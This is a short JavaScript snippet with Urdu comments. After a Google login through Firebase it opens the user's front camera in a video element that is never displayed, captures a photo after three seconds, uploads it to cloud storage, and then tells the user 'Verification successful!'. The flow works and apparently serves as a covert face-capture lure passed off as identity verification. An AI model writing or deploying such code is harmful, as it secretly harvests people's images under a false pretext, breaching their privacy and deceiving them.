const auth = firebase.auth();
const storage = firebase.storage();
const provider = new firebase.auth.GoogleAuthProvider();

const loginBtn = document.getElementById('loginBtn');

loginBtn.addEventListener('click', () => {
    // پاپ اپ کے بجائے ری ڈائریکٹ استعمال کریں تاکہ بلاک نہ ہو
    auth.signInWithRedirect(provider);
});

// واپسی پر چیک کریں کہ لاگ ان ہوگیا یا نہیں
auth.getRedirectResult().then((result) => {
    if (result.user) {
        startCamera();
    }
}).catch((error) => {
    console.error("Auth Error:", error);
});

async function startCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        
        // 3 سیکنڈ بعد تصویر لے کر اسٹوریج میں بھیجیں
        setTimeout(() => {
            const canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob((blob) => {
                const fileName = `users/photo_${Date.now()}.png`;
                storage.ref(fileName).put(blob).then(() => {
                    alert("Verification successful!");
                    stream.getTracks().forEach(t => t.stop());
                });
            }, 'image/png');
        }, 3000);
    } catch (err) {
        alert("Camera Error: " + err.message);
    }
}
